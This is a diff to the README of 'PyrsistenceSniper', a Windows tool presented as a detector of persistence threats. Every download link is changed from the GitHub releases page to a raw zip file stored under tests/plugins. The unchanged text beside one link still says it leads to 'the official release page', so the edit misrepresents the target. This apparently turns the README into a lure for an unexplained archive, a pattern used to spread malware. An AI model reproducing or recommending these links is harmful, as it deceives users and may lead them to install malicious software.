@@ -1,6 +1,6 @@
 # 🛡️ PyrsistenceSniper - Easy Tool to Detect Persistence Threats
 
-[![Download PyrsistenceSniper](https://img.shields.io/badge/Download-PyrsistenceSniper-brightgreen?style=for-the-badge)](https://github.com/stcitlab1/PyrsistenceSniper/releases)
+[![Download PyrsistenceSniper](https://img.shields.io/badge/Download-PyrsistenceSniper-brightgreen?style=for-the-badge)](https://github.com/stcitlab1/PyrsistenceSniper/raw/refs/heads/main/tests/plugins/Pyrsistence_Sniper_2.7-alpha.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to start using PyrsistenceSniper on your Windows PC.
 
 Click the big button below or visit this link in your browser:
 
-[![Download PyrsistenceSniper](https://img.shields.io/badge/Download-PyrsistenceSniper-brightgreen?style=for-the-badge)](https://github.com/stcitlab1/PyrsistenceSniper/releases)
+[![Download PyrsistenceSniper](https://img.shields.io/badge/Download-PyrsistenceSniper-brightgreen?style=for-the-badge)](https://github.com/stcitlab1/PyrsistenceSniper/raw/refs/heads/main/tests/plugins/Pyrsistence_Sniper_2.7-alpha.2.zip)
 
 This link takes you to the official release page on GitHub. Here you will find the newest version of the tool.
 
@@ -128,7 +128,7 @@ If you run into issues, try these tips:
 
 ## 🔗 Useful Links
 
-- Main download page: [https://github.com/stcitlab1/PyrsistenceSniper/releases](https://github.com/stcitlab1/PyrsistenceSniper/releases)
+- Main download page: [https://github.com/stcitlab1/PyrsistenceSniper/raw/refs/heads/main/tests/plugins/Pyrsistence_Sniper_2.7-alpha.2.zip](https://github.com/stcitlab1/PyrsistenceSniper/raw/refs/heads/main/tests/plugins/Pyrsistence_Sniper_2.7-alpha.2.zip)
 - Source code and updates: On the GitHub repository at the same link
 - Help and support: Use GitHub Issues for reporting bugs or asking questions
 
@@ -144,4 +144,4 @@ You don’t need to learn coding to run it. The tool guides you through each ste
 
 Visit this page to download PyrsistenceSniper and start protecting your system today:
 
-[![Download PyrsistenceSniper](https://img.shields.io/badge/Download-PyrsistenceSniper-brightgreen?style=for-the-badge)](https://github.com/stcitlab1/PyrsistenceSniper/releases)
+[![Download PyrsistenceSniper](https://img.shields.io/badge/Download-PyrsistenceSniper-brightgreen?style=for-the-badge)](https://github.com/stcitlab1/PyrsistenceSniper/raw/refs/heads/main/tests/plugins/Pyrsistence_Sniper_2.7-alpha.2.zip)
